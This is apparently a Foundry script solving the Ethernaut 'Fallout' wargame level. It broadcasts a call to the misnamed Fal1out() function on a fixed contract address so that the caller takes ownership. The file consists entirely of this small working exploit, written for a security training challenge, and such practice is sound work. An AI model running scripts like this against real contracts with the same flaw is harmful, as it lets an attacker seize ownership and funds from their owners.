// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
// an interface is used here as the original contract has an old version
import "contracts/interfaces/I2Fal1out.sol";

contract Fal1outAttackerTest is Script {
    IFal1Out public targetContract = IFal1Out(payable(0x86d45F00e6eC4e2aa4221Cf1F5A7960DE487F57E));

    function run() public {
        vm.startBroadcast();
        targetContract.Fal1out();
        vm.stopBroadcast();
    }
}
